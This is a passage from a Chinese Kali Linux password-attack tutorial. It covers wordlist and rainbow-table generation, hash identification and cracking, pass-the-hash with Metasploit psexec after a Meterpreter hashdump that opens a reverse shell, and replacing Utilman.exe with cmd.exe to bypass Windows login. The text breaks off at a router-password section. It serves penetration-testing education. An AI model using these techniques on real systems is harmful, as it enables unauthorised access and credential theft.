class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vi test</span></span><br><span class="line">root</span><br><span class="line">password</span><br></pre></td></tr></table></figure></li><li><p>使用rsmangler工具生成字典，并保存到pass.txt中。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat pass.txt</span></span><br><span class="line">root</span><br><span class="line">password</span><br><span class="line">rootpassword</span><br><span class="line">passwordroot</span><br><span class="line">rp</span><br><span class="line">rootroot</span><br><span class="line">toor</span><br><span class="line">Root</span><br><span class="line">ROOT</span><br><span class="line">rooted</span><br><span class="line">rooting</span><br><span class="line">pwroot</span><br><span class="line">rootpw</span><br><span class="line">pwdroot</span><br><span class="line">rootpwd</span><br><span class="line">adminroot</span><br><span class="line">rootadmin</span><br><span class="line">sysroot</span><br><span class="line">rootsys</span><br><span class="line">r007</span><br><span class="line">…//省略部分内容//…</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到生成的密码字典。由于篇幅所限，只列出了部分密码。</p></li></ol><h4 id="1-3-3-使用rtgen工具"><a href="#1-3-3-使用rtgen工具" class="headerlink" title="1.3.3 使用rtgen工具"></a>1.3.3 使用rtgen工具</h4><p>rtgen工具用来生成彩虹表。彩虹表是一个庞大的针对各种可能的字母组合和预先计算好的哈希值的集合。其中，生成的彩虹表包括多种算法，如LM、NTLM、MD5、SHA1和SHA256。然后，使用该彩虹表可以快速地破解各类密码。</p><p>语法格式如下：</p><blockquote><p>rtgen hash_algorithm charset plaintext_len_min plaintext_len_max table_index chain_len chain_num part_index</p></blockquote><p>或者：</p><blockquote><p>rtgen hash_algorithm charset plaintext_len_min plaintext_len_max table_index -bench</p></blockquote><p>以上语法中的参数含义如下：</p><blockquote><p>hash_algorithm：指定使用的哈希算法。其中，可指定的值包括lm、ntlm、md5、sha1和sha256。<br>charset：指定字符集。</p></blockquote><p>其中，rtgen工具默认提供的字符集文件为<code>/usr/share/rainbowcrack/charset.txt</code>，具体如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /usr/share/rainbowcrack/charset.txt</span></span><br><span class="line"></span><br><span class="line">numeric            = [0123456789]</span><br><span class="line"></span><br><span class="line">alpha              = [ABCDEFGHIJKLMNOPQRSTUVWXYZ]</span><br><span class="line">alpha-numeric      = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]</span><br><span class="line"></span><br><span class="line">loweralpha         = [abcdefghijklmnopqrstuvwxyz]</span><br><span class="line">loweralpha-numeric = [abcdefghijklmnopqrstuvwxyz0123456789]</span><br><span class="line"></span><br><span class="line">mixalpha           = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ]</span><br><span class="line">mixalpha-numeric   = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]</span><br><span class="line"></span><br><span class="line">ascii-32-95                  = [ !<span class="string">"#$%&amp;'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~]</span></span><br><span class="line"><span class="string">ascii-32-65-123-4            = [ !"</span><span class="comment">#$%&amp;'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`&#123;|&#125;~]</span></span><br><span class="line">alpha-numeric-symbol32-space = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@<span class="comment">#$%^&amp;*()-_+=~`[]&#123;&#125;|\:;"'&lt;&gt;,.?/ ]</span></span><br></pre></td></tr></table></figure><p>以上输出信息显示rtgen工具默认提供的所有字符集。</p><blockquote><p>plaintext_len_min：指定生成的密码最小长度；<br>plaintext_len_max：指定生成的密码最大长度；<br>table_index：指定表单数量；<br>chain_len：指定链长度；<br>chain_num：指定链个数；<br>part_index：指定块数量。</p></blockquote><p>使用rtgen工具生成一个基于MD5的彩虹表。其中，指定密码的最小长度为4，最大长度为8。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rtgen md5 loweralpha 4 8 0 1000 1000 0</span></span><br><span class="line">rainbow table md5_loweralpha<span class="comment">#4-8_0_1000x1000_0.rt parameters</span></span><br><span class="line"><span class="built_in">hash</span> algorithm:         md5</span><br><span class="line"><span class="built_in">hash</span> length:            16</span><br><span class="line">charset name:           loweralpha</span><br><span class="line">charset data:           abcdefghijklmnopqrstuvwxyz</span><br><span class="line">charset data <span class="keyword">in</span> hex:    61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 76 77 78 79 7a</span><br><span class="line">charset length:         26</span><br><span class="line">plaintext length range: 4 - 8</span><br><span class="line">reduce offset:          0x00000000</span><br><span class="line">plaintext total:        217180128880</span><br><span class="line"></span><br><span class="line">sequential starting point begin from 0 (0x0000000000000000)</span><br><span class="line">generating...</span><br><span class="line">1000 of 1000 rainbow chains generated (0 m 0.1 s)</span><br></pre></td></tr></table></figure><p>看到以上输出的信息，表示成功生成了一个基于MD5的彩虹表，文件名为<code>md5_loweralpha#4-8_0_1000x1000_0.rt</code>。其中，该彩虹表默认保存在<code>/usr/share/rainbowcrack</code>目录中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd /usr/share/rainbowcrack</span></span><br><span class="line"></span><br><span class="line">┌──(root💀docker-ptf)-[/usr/share/rainbowcrack]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">alglib0.so   md5_loweralpha<span class="comment">#4-8_0_1000x1000_0.rt  readme.txt  rtc2rt  rtmerge</span></span><br><span class="line">charset.txt  rcrack                               rt2rtc      rtgen   rtsort</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，生成的彩虹表文件为md5_loweralpha#4-8_0_1000x1000_0.rt。为了更方便使用生成的彩虹表，可以使用rtsort命令对其进行排序。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rtsort md5_loweralpha\#4-8_0_1000x1000_0.rt</span></span><br></pre></td></tr></table></figure><p>执行以上命令后，将不会输出任何信息。接下来，就可以使用该彩虹表实施密码破解了。</p><h2 id="二、破解哈希密码"><a href="#二、破解哈希密码" class="headerlink" title="二、破解哈希密码"></a>二、破解哈希密码</h2><p>为了避免信息泄漏造成的危害，在实际应用中，软件和系统会将密码进行加密，然后进行保存。常见的加密方式是各种哈希算法。这类算法可以将不同长度的密码加密成固定长度的字符串。由于加密后的字符串位定长，并且不能被直接逆向破解，所以安全度非常高，也因此被广泛应用。</p><h3 id="2-1-识别哈希加密方式"><a href="#2-1-识别哈希加密方式" class="headerlink" title="2.1 识别哈希加密方式"></a>2.1 识别哈希加密方式</h3><p>哈希加密是一类算法，包含很多种具体的算法。渗透测试者在破解一个哈希密码时，如果确定该哈希密码的加密方式，就可以选择针对性的工具和方式实施破解了，可以节约大量的时间，从而提高破解效率。下面介绍使用hashid工具识别哈希加密方式的方法。</p><h4 id="2-1-1-hashid工具"><a href="#2-1-1-hashid工具" class="headerlink" title="2.1.1 hashid工具"></a>2.1.1 hashid工具</h4><p>识别哈希密码值<code>6bcec2ba2597f089189735afeaa300d4</code>的加密方式。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hashid 6bcec2ba2597f089189735afeaa300d4</span></span><br><span class="line">Analyzing <span class="string">'6bcec2ba2597f089189735afeaa300d4'</span></span><br><span class="line">[+] MD2</span><br><span class="line">[+] MD5</span><br><span class="line">[+] MD4</span><br><span class="line">[+] Double MD5</span><br><span class="line">[+] LM</span><br><span class="line">[+] RIPEMD-128</span><br><span class="line">[+] Haval-128</span><br><span class="line">[+] Tiger-128</span><br><span class="line">[+] Skein-256(128)</span><br><span class="line">[+] Skein-512(128)</span><br><span class="line">[+] Lotus Notes/Domino 5</span><br><span class="line">[+] Skype</span><br><span class="line">[+] Snefru-128</span><br><span class="line">[+] NTLM</span><br><span class="line">[+] Domain Cached Credentials</span><br><span class="line">[+] Domain Cached Credentials 2</span><br><span class="line">[+] DNSSEC(NSEC3)</span><br><span class="line">[+] RAdmin v2.x</span><br></pre></td></tr></table></figure><p>以上输出信息显示了可能使用的哈希密码方式。其中，显示在前面的哈希类型方式可能性更大。由此可以猜测出，该密码的哈希类型为MD2或MD5。</p><h4 id="2-1-1-hash-identifier工具"><a href="#2-1-1-hash-identifier工具" class="headerlink" title="2.1.1 hash-identifier工具"></a>2.1.1 hash-identifier工具</h4><p>识别哈希密码值<code>6bcec2ba2597f089189735afeaa300d4</code>的加密方式。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hhhash-identifier</span></span><br><span class="line">   <span class="comment">#########################################################################</span></span><br><span class="line">   <span class="comment">#     __  __                     __           ______    _____           #</span></span><br><span class="line">   <span class="comment">#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span></span><br><span class="line">   <span class="comment">#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span></span><br><span class="line">   <span class="comment">#     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span></span><br><span class="line">   <span class="comment">#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span></span><br><span class="line">   <span class="comment">#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span></span><br><span class="line">   <span class="comment">#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span></span><br><span class="line">   <span class="comment">#                                                             By Zion3R #</span></span><br><span class="line">   <span class="comment">#                                                    www.Blackploit.com #</span></span><br><span class="line">   <span class="comment">#                                                   Root@Blackploit.com #</span></span><br><span class="line">   <span class="comment">#########################################################################</span></span><br><span class="line">--------------------------------------------------</span><br><span class="line"> HASH: e10adc3949ba59abbe56e057f20f883e</span><br><span class="line"></span><br><span class="line">Possible Hashs:</span><br><span class="line">[+] MD5</span><br><span class="line">[+] Domain Cached Credentials - MD4(MD4((<span class="variable">$pass</span>)).(strtolower(<span class="variable">$username</span>)))</span><br><span class="line"></span><br><span class="line">Least Possible Hashs:</span><br><span class="line">[+] RAdmin v2.x</span><br><span class="line">[+] NTLM</span><br><span class="line">[+] MD4</span><br><span class="line">[+] MD2</span><br><span class="line">[+] MD5(HMAC)</span><br><span class="line">[+] MD4(HMAC)</span><br><span class="line">[+] MD2(HMAC)</span><br><span class="line">[+] MD5(HMAC(Wordpress))</span><br><span class="line">[+] Haval-128</span><br><span class="line">[+] Haval-128(HMAC)</span><br><span class="line">[+] RipeMD-128</span><br><span class="line">[+] RipeMD-128(HMAC)</span><br><span class="line">[+] SNEFRU-128</span><br><span class="line">[+] SNEFRU-128(HMAC)</span><br><span class="line">[+] Tiger-128</span><br><span class="line">[+] Tiger-128(HMAC)</span><br><span class="line">[+] md5(<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>)</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>.<span class="variable">$username</span>)</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>.<span class="variable">$salt</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>.<span class="variable">$salt</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(md5(<span class="variable">$pass</span>).<span class="variable">$salt</span>))</span><br><span class="line">[+] md5(<span class="variable">$username</span>.0.<span class="variable">$pass</span>)</span><br><span class="line">[+] md5(<span class="variable">$username</span>.LF.<span class="variable">$pass</span>)</span><br><span class="line">[+] md5(<span class="variable">$username</span>.md5(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(md5(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(md5(<span class="variable">$pass</span>).md5(<span class="variable">$salt</span>))</span><br><span class="line">[+] md5(md5(<span class="variable">$salt</span>).<span class="variable">$pass</span>)</span><br><span class="line">[+] md5(md5(<span class="variable">$salt</span>).md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(md5(<span class="variable">$username</span>.<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(md5(md5(<span class="variable">$pass</span>)))</span><br><span class="line">[+] md5(md5(md5(md5(<span class="variable">$pass</span>))))</span><br><span class="line">[+] md5(md5(md5(md5(md5(<span class="variable">$pass</span>)))))</span><br><span class="line">[+] md5(sha1(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(sha1(md5(<span class="variable">$pass</span>)))</span><br><span class="line">[+] md5(sha1(md5(sha1(<span class="variable">$pass</span>))))</span><br><span class="line">[+] md5(strtoupper(md5(<span class="variable">$pass</span>)))</span><br><span class="line">--------------------------------------------------</span><br><span class="line"> HASH:</span><br></pre></td></tr></table></figure><p>以上输出信息显示该密码的哈希类型为MD5。</p><h3 id="2-2-破解LM-Hashes密码"><a href="#2-2-破解LM-Hashes密码" class="headerlink" title="2.2 破解LM Hashes密码"></a>2.2 破解LM Hashes密码</h3><p>LM（LAN Manager）Hash是Windows操作系统最早使用的密码哈希算法之一。下面将介绍使用findmyhash工具破解LM Hashes密码的方法。</p><p>使用findmyhash工具破解密码的语法格式如下：</p><blockquote><p>findmyhash<algorithm>OPTIONS</algorithm></p></blockquote><p>以上语法中，参数algorithm表示指定破解的密码算法类型，支持的算法有MD4、MD5、SHA1、SHA224、SHA256、SHA384、SHA512、RMD160、GOST、WHIRLPOOL、LM、NTLM、MYSQL、CISCO7、JUNIPER、LDAP_MD5和LDAp_SHA1。OPTIONS表示可用的选项。其中，常用的选项及含义如下：</p><blockquote><p>-h<hash_value>：指定破解的哈希值。<br>-f<file>：指定破解的哈希文件列表。<br>-g：如果不能破解哈希密码，将使用Google搜索并显示结果。其中，该选项只能和-h选项一起使用。</file></hash_value></p></blockquote><p>使用findmyhash工具破解LM哈希密码<code>5f4dcc3b5aa765d61d8327deb882cf99</code>的原始密码。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># findmyhash MD5 -h 5f4dcc3b5aa765d61d8327deb882cf99</span></span><br><span class="line">Cracking <span class="built_in">hash</span>: 5f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line">Analyzing with md5hood (http://md5hood.com)...</span><br><span class="line">... <span class="built_in">hash</span> not found <span class="keyword">in</span> md5hood</span><br><span class="line">Analyzing with stringfunction (http://www.stringfunction.com)...</span><br><span class="line">... <span class="built_in">hash</span> not found <span class="keyword">in</span> stringfunction</span><br><span class="line">Analyzing with 99k.org (http://xanadrel.99k.org)...</span><br><span class="line">... <span class="built_in">hash</span> not found <span class="keyword">in</span> 99k.org</span><br><span class="line">Analyzing with sans (http://isc.sans.edu)...</span><br><span class="line">... <span class="built_in">hash</span> not found <span class="keyword">in</span> sans</span><br><span class="line">Analyzing with bokehman (http://bokehman.com)...</span><br><span class="line">... <span class="built_in">hash</span> not found <span class="keyword">in</span> bokehman</span><br><span class="line">Analyzing with goog.li (http://goog.li)...</span><br><span class="line">... <span class="built_in">hash</span> not found <span class="keyword">in</span> goog.li</span><br><span class="line">…//省略部分内容//…</span><br><span class="line">Analyzing with rednoize (http://md5.rednoize.com)...</span><br><span class="line">... <span class="built_in">hash</span> not found <span class="keyword">in</span> rednoize</span><br><span class="line">Analyzing with md5-db (http://md5-db.de)...</span><br><span class="line">... <span class="built_in">hash</span> not found <span class="keyword">in</span> md5-db</span><br><span class="line">Analyzing with my-addr (http://md5.my-addr.com)...</span><br><span class="line">***** HASH CRACKED!! *****</span><br><span class="line">The original string is: password</span><br><span class="line">The following hashes were cracked:                                                                <span class="comment">#破解成功</span></span><br><span class="line">----------------------------------</span><br><span class="line">5f4dcc3b5aa765d61d8327deb882cf99 -&gt; password</span><br></pre></td></tr></table></figure><p>从以上输出信息可以看到，成功破解了LM哈希密码<code>5f4dcc3b5aa765d61d8327deb882cf99</code>的原始密码，原始密码为password。</p><h3 id="2-3-直接使用哈希密码值"><a href="#2-3-直接使用哈希密码值" class="headerlink" title="2.3 直接使用哈希密码值"></a>2.3 直接使用哈希密码值</h3><p>当用户无法破解哈希密码时，利用特定的漏洞可以直接使用哈希密码，而无须破解。在Metasploit框架中，可以通过使用<code>exploit/windows/smb/psexec</code>渗透测试模块，来直接使用哈希密码，绕过密码验证。</p><p>通过使用<code>exploit/windows/smb/psexec</code>渗透测试模块，来直接利用哈希密码。具体操作步骤如下：</p><ol><li><p>在Meterpreter会话中使用hashdump命令获取哈希密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:b3255351d8dfe7cdedf3f552a49146d6:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure></li><li><p>后台运行Meterpreter会话，并切换到模块配置界面。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 1...</span><br></pre></td></tr></table></figure></li><li><p>选择exploit/windows/smb/psexec模块，并查看模块配置选项。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; show options </span><br><span class="line">Module options (exploit/windows/smb/psexec):</span><br><span class="line">   Name        Current Setting        Required        Description</span><br><span class="line">   ----        ---------------        --------        -----------</span><br><span class="line">   RHOSTS                             yes        The target address range or CIDR identifier</span><br><span class="line">   RPORT        445                   yes        The SMB service port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                no        Service description to to be used on target <span class="keyword">for</span> pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME               no        The service display name</span><br><span class="line">   SERVICE_NAME                       no        The service name</span><br><span class="line">   SHARE        ADMIN$                yes        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal <span class="built_in">read</span>/write folder share</span><br><span class="line">   SMBDomain        .                 no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                            no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                            no        The username to authenticate as</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure></li><li><p>配置选项参数。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec) &gt; <span class="built_in">set</span> RHOSTS 192.168.197.129   <span class="comment">#设置远程主机地址</span></span><br><span class="line">RHOSTS =&gt; 192.168.197.129</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; <span class="built_in">set</span> SMBUser administrator    <span class="comment">#设置SMB用户</span></span><br><span class="line">SMBUser =&gt; administrator</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; <span class="built_in">set</span> SMBUser Administrator</span><br><span class="line">SMBUser =&gt; Administrator</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; <span class="built_in">set</span> SMBPass aad3b435b51404eeaad3b435b51404ee:b3255351d8dfe7cdedf3f552a49146d6  <span class="comment">#设置SMB密码</span></span><br><span class="line">SMBPass =&gt; aad3b435b51404eeaad3b435b51404ee:b3255351d8dfe7cdedf3f552a49146d6</span><br></pre></td></tr></table></figure></li><li><p>实施渗透，直接使用哈希密码值。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.197.128:4444 </span><br><span class="line">[*] 192.168.197.129:445 - Connecting to the server...</span><br><span class="line">[*] 192.168.197.129:445 - Authenticating to 192.168.197.129:445 as user <span class="string">'Administrator'</span>...</span><br><span class="line">[*] 192.168.197.129:445 - Selecting PowerShell target</span><br><span class="line">[*] 192.168.197.129:445 - Executing the payload...</span><br><span class="line">[+] 192.168.197.129:445 - Service start timed out, OK <span class="keyword">if</span> running a <span class="built_in">command</span> or non-service executable...</span><br><span class="line">[*] Sending stage (175174 bytes) to 192.168.197.129</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.197.128:4444 -&gt; 192.168.197.129:49170) at 2021-01-05 12:45:48 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，使用bob用户成功地打开了一个会话。</p></li></ol><h2 id="三、借助Utilman绕过Windows登录"><a href="#三、借助Utilman绕过Windows登录" class="headerlink" title="三、借助Utilman绕过Windows登录"></a>三、借助Utilman绕过Windows登录</h2><p>Utilman是Windows辅助工具管理器。在Windows下，即使没有进行用户登录，也可以使用Windows+U组合键调用Utilman进程。借助该机制，可以绕过Windows登录验证机制，对系统进行操作。</p><p>通过将Utilman.exe文件替换成cmd.exe，绕过登录进行操作。具体操作步骤如下：</p><ol><li><p>在Windows系统的计算机上，使用U盘安装介质的方式进入Kali Linux的Live模式。首先启动U盘安装介质，将显示系统安装引导界面，如下图所示。</p><p><img src="/2021/01/05/kali-mi-ma-gong-ji/%E5%9B%BE%E7%89%873.png" alt="图片3"></p></li><li><p>在该界面选择Live(amd64)，即可进入Live模式。然后，在该Live模式中打开Windows文件系统。如图下图所示，在该界面依次选择Places|Computer选项。</p><p><img src="/2021/01/05/kali-mi-ma-gong-ji/%E5%9B%BE%E7%89%874.png" alt="图片4"></p></li><li><p>在该界面单击Computer选项后，将打开本地计算机文件系统，如下图所示。</p><p><img src="/2021/01/05/kali-mi-ma-gong-ji/%E5%9B%BE%E7%89%875.png" alt="图片5"></p></li><li><p>该界面显示了Linux Live系统的文件列表。此时，在左侧栏中选择Other Locations命令，即可看到其他硬盘文件，如下图所示。</p><p><img src="/2021/01/05/kali-mi-ma-gong-ji/%E5%9B%BE%E7%89%876.png" alt="图片6"></p></li><li><p>该界面显示了该计算机中的所有磁盘分区。根据显示的分区大小，找到Windows系统的分区。在本例中，Windows系统的分区为322GB Volume。所以，打开该硬盘分区，将显示Windows系统的文件列表，如下图所示。</p><p><img src="/2021/01/05/kali-mi-ma-gong-ji/%E5%9B%BE%E7%89%877.png" alt="图片7"></p></li><li><p>在该界面依次进入Windows|System32文件夹，将显示如下图所示的内容。</p><p><img src="/2021/01/05/kali-mi-ma-gong-ji/%E5%9B%BE%E7%89%878.png" alt="图片8"></p></li><li><p>在该文件夹中找到Utilman.exe文件，将该文件重命名为Utilman.old。然后复制该目录下的cmd.exe文件作为副本，并将其文件名修改为Utilman.exe。接下来，关闭Kali Linux Live模式，并启动Windows系统。在登录界面按Wins+U组合键，将显示如下图所示的界面。</p><p><img src="/2021/01/05/kali-mi-ma-gong-ji/%E5%9B%BE%E7%89%879.png" alt="图片9"></p></li><li><p>从该界面可以看到，打开了一个命令提示符窗口。在该窗口中，可以执行各种终端命令。例如，使用whoami命令查看用户信息，如下图所示。</p><p><img src="/2021/01/05/kali-mi-ma-gong-ji/%E5%9B%BE%E7%89%8710.png" alt="图片10"></p></li><li><p>从输出的信息可以看到，当前用户拥有最高的权限。此时，可以进行任何的操作。</p></li></ol><h2 id="四、路由器密码破解"><a href="#四、路由器密码破解" class="headerlink" title="四、路由器密码破解"></a>四、路由器密码破解</h2><p>路由器是一个网络的核心设备。一旦控制路由器，就很容易对连接该路由器的主机实施各种数据嗅探和欺骗攻击。大部分路由器都是使用用户名/密码的身份验证方式。而每个路由器的管理界面都有初始用户名和密码。由于一些管理员用户的失误，可能会使用初始密码或者弱密码。</p><h3 id="4-1-路由器初始密码"><a href="#4-1-路由器初始密码" class="headerlink" title="4.1 路由器初始密码"></a>4.1 